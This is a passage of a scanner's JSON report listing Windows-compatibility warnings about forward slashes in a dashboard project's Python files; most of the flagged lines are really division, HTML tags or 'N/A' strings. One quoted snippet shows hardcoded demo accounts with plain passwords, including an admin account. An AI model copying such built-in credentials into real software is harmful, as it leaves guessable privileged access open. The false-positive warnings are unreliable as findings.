        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 370: Forward slash in path - ', Roboto, sans-serif;\n                    margin: 0;\n                    padding: 0;\n                    background: #1a1a1a;\n                    color: #ffffff;\n                }}\n                \n                .header {{\n                    background: #2d3748;\n                    padding: 1rem;\n                    border-bottom: 1px solid #4a5568;\n                }}\n                \n                .header h1 {{\n                    margin: 0;\n                    color: #63b3ed;\n                }}\n                \n                .dashboard-grid {{\n                    display: grid;\n                    grid-template-columns: 1fr 1fr;\n                    grid-template-rows: 300px 300px 1fr;\n                    gap: 1rem;\n                    padding: 1rem;\n                    height: calc(100vh - 80px);\n                }}\n                \n                .panel {{\n                    background: #2d3748;\n                    border: 1px solid #4a5568;\n                    border-radius: 8px;\n                    padding: 1rem;\n                    overflow: auto;\n                }}\n                \n                .network-visualization {{\n                    grid-column: 1 / 3;\n                    position: relative;\n                }}\n                \n                .metrics-panel {{\n                    grid-row: 2;\n                }}\n                \n                .interactions-panel {{\n                    grid-row: 2;\n                }}\n                \n                .agents-list {{\n                    grid-column: 1 / 3;\n                }}\n                \n                .agent-node {{\n                    position: absolute;\n                    width: 60px;\n                    height: 60px;\n                    border-radius: 50%;\n                    background: #63b3ed;\n                    display: flex;\n                    align-items: center;\n                    justify-content: center;\n                    font-weight: bold;\n                    font-size: 12px;\n                    cursor: pointer;\n                    transition: all 0.3s ease;\n                }}\n                \n                .agent-node:hover {{\n                    background: #90cdf4;\n                    transform: scale(1.1);\n                }}\n                \n                .agent-node.active {{\n                    background: #68d391;\n                }}\n                \n                .agent-node.error {{\n                    background: #fc8181;\n                }}\n                \n                .connection-line {{\n                    position: absolute;\n                    height: 2px;\n                    background: #4a5568;\n                    transform-origin: left center;\n                    pointer-events: none;\n                }}\n                \n                .metrics-grid {{\n                    display: grid;\n                    grid-template-columns: 1fr 1fr;\n                    gap: 0.5rem;\n                }}\n                \n                .metric-card {{\n                    background: #1a202c;\n                    padding: 0.75rem;\n                    border-radius: 4px;\n                    text-align: center;\n                }}\n                \n                .metric-value {{\n                    font-size: 1.5rem;\n                    font-weight: bold;\n                    color: #63b3ed;\n                }}\n                \n                .metric-label {{\n                    font-size: 0.875rem;\n                    color: #a0aec0;\n                }}\n                \n                .interaction-item {{\n                    background: #1a202c;\n                    margin: 0.5rem 0;\n                    padding: 0.75rem;\n                    border-radius: 4px;\n                    font-size: 0.875rem;\n                }}\n                \n                .status-indicator {{\n                    display: inline-block;\n                    width: 8px;\n                    height: 8px;\n                    border-radius: 50%;\n                    margin-right: 0.5rem;\n                }}\n                \n                .status-active {{ background: #68d391; }}\n                .status-idle {{ background: #a0aec0; }}\n                .status-error {{ background: #fc8181; }}\n                \n                .connection-status {{\n                    position: fixed;\n                    top: 1rem;\n                    right: 1rem;\n                    padding: 0.5rem 1rem;\n                    border-radius: 4px;\n                    font-size: 0.875rem;\n                }}\n                \n                .connection-status.connected {{\n                    background: #38a169;\n                    color: white;\n                }}\n                \n                .connection-status.disconnected {{\n                    background: #e53e3e;\n                    color: white;\n                }}\n            </style>\n        </head>\n        <body>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 523: Forward slash in path - \">\n                <h1>{self.dashboard_title}</h1>\n            </div>\n            \n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264709"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 527: Forward slash in path - \">Connecting...</div>\n            \n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264732"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 530: Forward slash in path - \">\n                    <h3>Agent Network</h3>\n                    <div id=\"",
        "timestamp": "2025-09-05T17:30:42.264768"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 532: Forward slash in path - \"></div>\n                </div>\n                \n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264793"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 535: Forward slash in path - \">\n                    <h3>System Metrics</h3>\n                    <div id=\"",
        "timestamp": "2025-09-05T17:30:42.264817"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 537: Forward slash in path - \"></div>\n                </div>\n                \n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264840"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 540: Forward slash in path - \">\n                    <h3>Recent Interactions</h3>\n                    <div id=\"",
        "timestamp": "2025-09-05T17:30:42.264863"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 542: Forward slash in path - \"></div>\n                </div>\n                \n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.264887"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 545: Forward slash in path - \">\n                    <h3>Active Agents</h3>\n                    <div id=\"",
        "timestamp": "2025-09-05T17:30:42.264910"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 547: Forward slash in path - \"></div>\n                </div>\n            </div>\n            \n            <script>\n                class DashboardClient {{\n                    constructor() {{\n                        this.ws = null;\n                        this.reconnectAttempts = 0;\n                        this.maxReconnectAttempts = 5;\n                        this.data = {{}};\n                        this.connect();\n                    }}\n                    \n                    connect() {{\n                        const protocol = window.location.protocol === '",
        "timestamp": "2025-09-05T17:30:42.264943"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 562: Forward slash in path - ';\n                        const wsUrl = `${{protocol}}//${{window.location.host}}/ws`;\n                        \n                        this.ws = new WebSocket(wsUrl);\n                        \n                        this.ws.onopen = () => {{\n                            console.log('",
        "timestamp": "2025-09-05T17:30:42.264971"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 621: Forward slash in path - ';\n                        \n                        if (!this.data.agents) return;\n                        \n                        const containerRect = container.getBoundingClientRect();\n                        const width = containerRect.width || 400;\n                        const height = containerRect.height || 200;\n                        \n                        // Draw agents\n                        Object.entries(this.data.agents).forEach(([name, agent]) => {{\n                            const node = document.createElement('",
        "timestamp": "2025-09-05T17:30:42.265036"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 656: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.265084"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 663: Forward slash in path - \">${{metric.value}}</div>\n                                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.265116"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 664: Forward slash in path - \">${{metric.label}}</div>\n                            `;\n                            container.appendChild(card);\n                        }});\n                    }}\n                    \n                    updateInteractions() {{\n                        const container = document.getElementById('",
        "timestamp": "2025-09-05T17:30:42.265150"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 681: Forward slash in path - \"></span>\n                                    ${{interaction.from_agent || '",
        "timestamp": "2025-09-05T17:30:42.265192"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 682: Forward slash in path - '}}\n                                </div>\n                                <div style=\"",
        "timestamp": "2025-09-05T17:30:42.265219"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 684: Forward slash in path - \">\n                                    ${{new Date(interaction.timestamp).toLocaleTimeString()}}\n                                </div>\n                            `;\n                            container.appendChild(item);\n                        }});\n                    }}\n                    \n                    updateAgentsList() {{\n                        const container = document.getElementById('",
        "timestamp": "2025-09-05T17:30:42.265248"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 709: Forward slash in path - \">\n                                    <div>\n                                        <strong>${{name}}</strong>\n                                        <div style=\"",
        "timestamp": "2025-09-05T17:30:42.265288"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 712: Forward slash in path - \">\n                                            State: ${{agent.state}} | Tasks: ${{agent.metrics?.total_tasks || 0}}\n                                        </div>\n                                    </div>\n                                    <span class=\"",
        "timestamp": "2025-09-05T17:30:42.265325"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 716: Forward slash in path - \"></span>\n                                </div>\n                            `;\n                            \n                            agentEl.onclick = () => this.showAgentDetails(name);\n                            container.appendChild(agentEl);\n                        }});\n                    }}\n                    \n                    showAgentDetails(agentName) {{\n                        this.ws.send(JSON.stringify({{\n                            type: '",
        "timestamp": "2025-09-05T17:30:42.265397"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "warning": "Line 727: Forward slash in path - ',\n                            agent_name: agentName\n                        }}));\n                    }}\n                }}\n                \n                // Initialize dashboard\n                const dashboard = new DashboardClient();\n            </script>\n        </body>\n        </html>\n        \"",
        "timestamp": "2025-09-05T17:30:42.265438"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Line 74: Forward slash in path - \"redis://localhost:6379\"",
        "timestamp": "2025-09-05T17:30:42.266401"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Line 80: Forward slash in path - \"sqlite+aiosqlite:///./dashboard_data.db\"",
        "timestamp": "2025-09-05T17:30:42.266412"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Line 236: Forward slash in path - '] / 3600,\n            '",
        "timestamp": "2025-09-05T17:30:42.266500"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\services\\data_service.py",
        "warning": "Line 299: Forward slash in path - ')\n        \n        daily_processing = []\n        base_docs = 1000\n        \n        for i, date in enumerate(dates):\n            # Add some realistic patterns (weekends lower, month-end higher)\n            weekday_factor = 0.7 if date.weekday() >= 5 else 1.0  # Weekend reduction\n            month_end_factor = 1.3 if date.day >= 28 else 1.0    # Month-end boost\n            trend_factor = 1 + (i / days) * 0.2                   # Growth trend\n            \n            doc_count = int(base_docs * weekday_factor * month_end_factor * trend_factor * np.random.uniform(0.8, 1.2))\n            \n            daily_processing.append({\n                '",
        "timestamp": "2025-09-05T17:30:42.266554"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "warning": "Line 179: Forward slash in path - \">\n            🚀 Enterprise Dashboard Login\n        </h2>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.267151"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "warning": "Line 214: Forward slash in path - \"\n            **Demo Account:**\n            - Email: demo@company.com\n            - Password: demo123\n            - Role: Read-only access\n            \n            **Manager Account:**\n            - Email: manager@company.com  \n            - Password: manager123\n            - Role: Read/Write access\n            \n            **Admin Account:**\n            - Email: admin@company.com\n            - Password: admin123\n            - Role: Full access\n            \"",
        "timestamp": "2025-09-05T17:30:42.267194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "warning": "Line 244: Forward slash in path - \")\n        \n        # Session info\n        if st.session_state.session_expires:\n            time_remaining = st.session_state.session_expires - datetime.utcnow()\n            hours_remaining = int(time_remaining.total_seconds() / 3600)\n            st.sidebar.markdown(f\"",
        "timestamp": "2025-09-05T17:30:42.267218"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 32: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267656"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 50: Forward slash in path - \"{symbol}{amount/1000000:.1f}M\"",
        "timestamp": "2025-09-05T17:30:42.267671"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 53: Forward slash in path - \"{symbol}{amount/1000:.1f}K\"",
        "timestamp": "2025-09-05T17:30:42.267677"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 72: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267690"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 91: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267703"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 99: Forward slash in path - \"{value/1000000000:.1f}B\"",
        "timestamp": "2025-09-05T17:30:42.267712"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 102: Forward slash in path - \"{value/1000000:.1f}M\"",
        "timestamp": "2025-09-05T17:30:42.267719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 105: Forward slash in path - \"{value/1000:.1f}K\"",
        "timestamp": "2025-09-05T17:30:42.267727"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 123: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267739"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 127: Forward slash in path - \"\n        elif seconds < 3600:\n            minutes = seconds / 60\n            return f\"",
        "timestamp": "2025-09-05T17:30:42.267748"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 130: Forward slash in path - \"\n        elif seconds < 86400:\n            hours = seconds / 3600\n            return f\"",
        "timestamp": "2025-09-05T17:30:42.267755"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 133: Forward slash in path - \"\n        else:\n            days = seconds / 86400\n            return f\"",
        "timestamp": "2025-09-05T17:30:42.267764"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 152: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 156: Forward slash in path - \"%m/%d/%Y\"",
        "timestamp": "2025-09-05T17:30:42.267786"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 164: Forward slash in path - \"\n            elif diff.seconds > 3600:\n                hours = diff.seconds // 3600\n                return f\"",
        "timestamp": "2025-09-05T17:30:42.267799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 167: Forward slash in path - \"\n            elif diff.seconds > 60:\n                minutes = diff.seconds // 60\n                return f\"",
        "timestamp": "2025-09-05T17:30:42.267809"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 189: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267825"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 195: Forward slash in path - \"]\n        i = int(np.floor(np.log(size_bytes) / np.log(1024)))\n        p = np.power(1024, i)\n        s = round(size_bytes / p, 2)\n        \n        return f\"",
        "timestamp": "2025-09-05T17:30:42.267837"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 220: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267858"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 225: Forward slash in path - \":\n            delta_pct = (delta / previous) * 100\n            delta_str = f\"",
        "timestamp": "2025-09-05T17:30:42.267870"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 244: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267889"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 292: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267927"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 312: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267946"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 328: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.267963"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 332: Forward slash in path - \"{formatted_value} {unit}/{time_period}\"",
        "timestamp": "2025-09-05T17:30:42.267975"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 334: Forward slash in path - \"0 {unit}/{time_period}\"",
        "timestamp": "2025-09-05T17:30:42.267986"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 372: Forward slash in path - \">{title}</h4>\n        <h2 style=\"",
        "timestamp": "2025-09-05T17:30:42.268014"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 373: Forward slash in path - \">{value}</h2>\n        {f'",
        "timestamp": "2025-09-05T17:30:42.268026"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 374: Forward slash in path - \">{delta}</p>'",
        "timestamp": "2025-09-05T17:30:42.268040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 375: Forward slash in path - \">{status}</p>'",
        "timestamp": "2025-09-05T17:30:42.268053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 375: Forward slash in path - '}\n    </div>\n    \"",
        "timestamp": "2025-09-05T17:30:42.268065"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\formatting.py",
        "warning": "Line 412: Forward slash in path - \"N/A\"",
        "timestamp": "2025-09-05T17:30:42.268098"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 332: Forward slash in path - ': combination_count / len(agent_capabilities)\n                        },\n                        '",
        "timestamp": "2025-09-05T17:30:42.268826"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 334: Forward slash in path - ': min(1.0, combination_count / len(agent_capabilities) + 0.3),\n                        '",
        "timestamp": "2025-09-05T17:30:42.268850"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 343: Forward slash in path - ': 0.0}\n        \n        # Analyze action types and parameters\n        action_types = [obs.action.action_type for obs in successful_strategies]\n        unique_types = set(action_types)\n        \n        # Calculate novelty based on uniqueness and success pattern\n        novelty_score = 0.5  # Base score\n        \n        # Bonus for unique action types\n        if len(unique_types) > 2:\n            novelty_score += 0.2\n        \n        # Bonus for consistent success\n        success_rate = sum(1 for obs in successful_strategies if obs.success) / len(successful_strategies)\n        novelty_score += success_rate * 0.3\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.268880"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 509: Forward slash in path - \"\n        capabilities = []\n        \n        # Group agents by domain/specialization\n        domain_agents = defaultdict(list)\n        for agent_name, agent in agents.items():\n            # Extract domain from agent'",
        "timestamp": "2025-09-05T17:30:42.269006"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 566: Forward slash in path - \"\n        if len(performance_history) < 10:\n            return None\n        \n        # Look for sudden performance jumps\n        recent_performance = performance_history[-5:]\n        older_performance = performance_history[-15:-5]\n        \n        recent_avg = sum(recent_performance) / len(recent_performance)\n        older_avg = sum(older_performance) / len(older_performance)\n        \n        improvement = recent_avg - older_avg\n        \n        if improvement >= 0.2:  # 20% improvement threshold\n            return {\n                '",
        "timestamp": "2025-09-05T17:30:42.269066"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 654: Forward slash in path - ': len(common_patterns) / max(len(patterns_a_dict), len(patterns_b_dict))\n                    })\n        \n        return transfer_patterns\n    \n    async def _filter_capabilities(self, capabilities: List[EmergentCapability]) -> List[EmergentCapability]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.269142"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 720: Forward slash in path - \"\n        # Calculate recent success rate\n        recent_successes = [obs for obs in recent_observations if obs.success]\n        recent_success_rate = len(recent_successes) / len(recent_observations)\n        \n        # Compare with historical baseline\n        baseline_success_rate = agent.get_success_rate()\n        improvement = recent_success_rate - baseline_success_rate\n        \n        # Significant improvement threshold\n        if improvement >= 0.3:  # 30% improvement\n            return BreakthroughBehavior(\n                behavior_id=f\"",
        "timestamp": "2025-09-05T17:30:42.269205"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 790: Forward slash in path - '):\n                recent_obs = [obs for obs in agent.memory.episodic_memory if obs.timestamp >= cutoff_time]\n                if len(recent_obs) >= 3:\n                    recent_success_rate = sum(1 for obs in recent_obs if obs.success) / len(recent_obs)\n                    baseline_success_rate = agent.get_success_rate()\n                    improvement = recent_success_rate - baseline_success_rate\n                    if improvement > 0.1:  # 10% improvement threshold\n                        improvements[agent_name] = improvement\n        \n        # Check for synchronized improvement\n        if len(improvements) >= 3:  # At least 3 agents improved simultaneously\n            avg_improvement = sum(improvements.values()) / len(improvements)\n            \n            if avg_improvement >= 0.2:  # 20% average improvement\n                return BreakthroughBehavior(\n                    behavior_id=f\"",
        "timestamp": "2025-09-05T17:30:42.269275"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 810: Forward slash in path - ': cutoff_time.isoformat()\n                    },\n                    participating_agents=list(improvements.keys()),\n                    performance_improvement=avg_improvement,\n                    confidence_score=min(1.0, len(improvements) / len(agents)),\n                    reproducibility_evidence=[{\n                        '",
        "timestamp": "2025-09-05T17:30:42.269310"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 875: Forward slash in path - \"\n        \n        # Calculate recent success rate\n        recent_successes = [obs for obs in recent_observations if obs.success]\n        recent_success_rate = len(recent_successes) / len(recent_observations)\n        \n        # Compare with historical baseline\n        baseline_success_rate = agent.get_success_rate()\n        \n        improvement = recent_success_rate - baseline_success_rate\n        \n        # Significant improvement threshold\n        if improvement >= 0.3:  # 30% improvement\n            return BreakthroughBehavior(\n                behavior_id=f\"",
        "timestamp": "2025-09-05T17:30:42.269380"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "warning": "Line 918: Forward slash in path - '):\n                recent_obs = [obs for obs in agent.memory.episodic_memory if obs.timestamp >= cutoff_time]\n                if len(recent_obs) >= 3:\n                    recent_success_rate = sum(1 for obs in recent_obs if obs.success) / len(recent_obs)\n                    baseline_success_rate = agent.get_success_rate()\n                    improvement = recent_success_rate - baseline_success_rate\n                    if improvement > 0.1:  # 10% improvement threshold\n                        improvements[agent_name] = improvement\n        \n        # Check for synchronized improvement\n        if len(improvements) >= 3:  # At least 3 agents improved simultaneously\n            avg_improvement = sum(improvements.values()) / len(improvements)\n            \n            if avg_improvement >= 0.2:  # 20% average improvement\n                return BreakthroughBehavior(\n                    behavior_id=f\"",
        "timestamp": "2025-09-05T17:30:42.269439"
      },
      {
        "category": "WINDOWS_COMPAT",
